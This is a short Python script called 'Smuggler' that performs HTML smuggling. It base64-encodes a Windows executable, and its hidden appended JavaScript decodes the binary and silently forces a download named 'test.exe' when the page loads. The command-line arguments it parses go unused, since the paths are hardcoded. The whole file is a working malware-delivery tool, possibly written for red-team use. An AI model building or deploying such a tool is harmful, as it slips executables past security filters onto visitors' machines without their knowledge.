import base64
import argparse
from bs4 import BeautifulSoup

HELP_STRING = """
        Smuggler
        Smuggle payloads in HTML files.
        """

def create_javascript(data, fileName):
    js_script = f"""
        const data = window.atob("{data}")
        const fileName = "{fileName}"

        const blob = new Blob([data], {{type: 'octet/stream'}})

        const a = document.createElement('a')
        document.body.appendChild(a);
        a.style = 'display: none';
        const url = window.URL.createObjectURL(blob);
        a.href = url;
        a.download = fileName;
        a.click();
        window.URL.revokeObjectURL(url);
    """
    return js_script

def main(flags):

    with open("./payload/WinPayload.exe", "rb") as payload_file:
        binary_data = payload_file.read()
        encoded_data = base64.b64encode(binary_data).decode()

    with open("toolbox/index.html", "r", encoding="utf-8") as original_file:
        html_content = original_file.read()

    soup = BeautifulSoup(html_content, "html.parser")

    new_script = soup.new_tag("script")
    new_script.string = create_javascript(encoded_data, "test.exe")
    soup.body.append(new_script)

    with open("modified_index.html", "w", encoding="utf-8") as new_file:
        new_file.write(str(soup.prettify()))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="Smuggler",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description= HELP_STRING
    )

    # Mandatory
    parser.add_argument("-p","--payload", help="The payload to embed in the html", required=True)
    parser.add_argument("-hf","--htmlfile", help="The html file to embed into", required=True)

    argparse_args = parser.parse_args()

    main(argparse_args)
